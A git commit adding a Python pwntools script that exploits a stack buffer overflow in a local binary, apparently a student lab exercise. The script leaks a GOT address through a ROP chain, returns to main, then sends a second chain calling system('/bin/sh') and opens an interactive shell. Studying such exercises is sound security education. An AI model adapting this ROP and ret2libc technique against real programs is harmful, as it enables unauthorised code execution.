3eeff6cb07bb4f309c2714c93a5bf7b051c2c376
root <bmedicke@gmail.com>
2022-02-26 15:13:38 +0100

    add bypass script

---
+++ Linux Anwendung/bypass.py
@@ -0,0 +1,67 @@
+#!/usr/bin/env python3
+
+from pwn import *
+import binascii
+
+
+system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
+exit_call = b"\x00\x00\x7f\xff\xf7\xe1\x51\x00"[::-1]
+bin_sh_string = b"\x00\x00\x7F\xFF\xF7\xF6\xE8\x82"[::-1]
+
+buffer = 128 * b"a"  # 0x61
+backup_base_pointer = 8 * b"b"
+backup_instruction_pointer = system_call
+
+rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
+rop_puts = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
+
+double_pop_ret = b"\x00\x00\x00\x00\x00\x40\x12\x01"[::-1]
+puts_got = b"\x00\x00\x00\x00\x00\x40\x3f\xc8"[::-1]
+flush_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd0"[::-1]
+scanf_got = b"\x00\x00\x00\x00\x00\x40\x3f\xd8"[::-1]
+
+copy_line4 = b"\x00\x00\x00\x00\x00\x40\x11\x46"[::-1]
+main_line0 = b"\x00\x00\x00\x00\x00\x40\x11\x69"[::-1]
+
+
+payload1 = (
+    buffer
+    + backup_base_pointer  # for padding.
+    + rop_pop_rdi_ret
+    + puts_got
+    + rop_puts  # works with aslr.
+    + main_line0
+    # jump back
+    # + scanf_got
+    # + flush_got
+    # + rop_pop_rdi_ret  # works with aslr.
+    # + bin_sh_string  # broken by aslr.
+    # + system_call  # broken by aslr.
+    # + exit_call  # broken by aslr.
+)
+
+f = open("payload", "wb")
+f.write(payload1)
+f.close()
+
+p = process("./bin")
+raw_input(f"attach with gdb, then press enter:\ngdb -p {p.pid}")
+p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
+p.sendline(payload1)
+r = p.recvn(7)
+print(binascii.b2a_hex(r))
+
+p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
+
+payload2 = (
+    buffer
+    + backup_base_pointer
+    + rop_pop_rdi_ret
+    + bin_sh_string
+    + system_call
+    + exit_call
+)
+
+p.sendline(payload2)
+
+p.interactive()
